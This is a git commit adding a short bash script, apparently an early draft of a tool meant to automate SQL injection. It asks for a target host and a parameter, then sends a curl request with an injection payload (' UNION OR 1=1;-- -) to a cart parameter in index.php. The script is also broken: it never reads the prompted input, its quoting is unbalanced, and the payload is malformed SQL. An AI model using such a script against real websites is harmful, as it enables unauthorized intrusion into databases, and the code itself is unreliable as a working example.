4073f46ded1a6b51686dca0c0b59187b863a11d0
H1sok4 <88634883+H1sok444@users.noreply.github.com>
2025-05-17 02:35:50 +0100

    Update sqldestruction.sh

--- SQL Injection/sqldestruction.sh
+++ SQL Injection/sqldestruction.sh
@@ -1,1 +1,7 @@
+#!/bin/bash
+# This is a script that is made to automate sql injections
 
+echo "Enter the host info (ip/domain)" 
+echo "Submit the the vulnerable/suspected parameter"
+
+curl $host/index.php?cart=' UNION OR 1=1;-- -
